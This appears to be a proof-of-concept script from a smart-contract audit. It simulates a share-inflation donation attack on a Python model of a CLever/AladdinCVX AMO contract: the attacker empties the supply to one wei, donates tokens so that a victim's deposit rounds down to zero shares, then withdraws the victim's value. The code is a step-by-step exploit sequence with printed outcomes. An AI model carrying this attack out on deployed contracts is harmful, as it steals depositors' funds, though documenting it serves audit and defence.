"""T17  AMO share-inflation boundary (B1/B2 at totalSupply ~ 0): shares = min(debtOut*S/debtPre,
lpOut*S/lpPre) (L8575-L8579) floors to 0 when S is tiny and the pre-balances were inflated by a
donation (donate L8684-L8688 has no minimum and no access control) converted at checkpoint (L8774-L8786).
Precondition: the attacker holds the entire supply (fresh or emptied AMO).
"""
import os, sys, copy
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solsem import atomic
from furnace_model import Furnace
import amo_model as M
from amo_port import AMO   # CLeverAMOBase/AladdinCVX port

E18 = 10**18
F = Furnace(periodLength=0)
pool = M.CurvePlain2(1_000_000 * E18, 1_200_000 * E18, A=100)
amo = AMO(F, pool, supply=0, lp_in_strategy=0)
amo.base += 10 * E18; amo.locked["att"] = 10 * E18
print("attacker unlock(0) on empty AMO      ->", atomic(amo, amo.unlock, "att", 0))
S = amo.totalSupply
r = atomic(amo, amo.withdraw, "att", S - 1)
print("attacker withdraw(all but 1 wei share) ->", r, " totalSupply =", amo.totalSupply)
amo.pending += 2000 * E18                 # attacker donate(2000e18)
print("attacker checkpoint() converting donation ->", atomic(amo, amo.checkpoint, 0)[0],
      " debtBalance=%d lp=%d" % (amo.debtBalance(), amo.lp))
amo.base += 1000 * E18; amo.locked["victim"] = 1000 * E18
v = atomic(amo, amo.unlock, "victim", 0)
print("victim unlock(minShareOut=0)          ->", v, getattr(amo, "dbg", ""))
w = atomic(amo, amo.withdraw, "att", 1)
print("attacker withdraw(1 share)            ->", w)
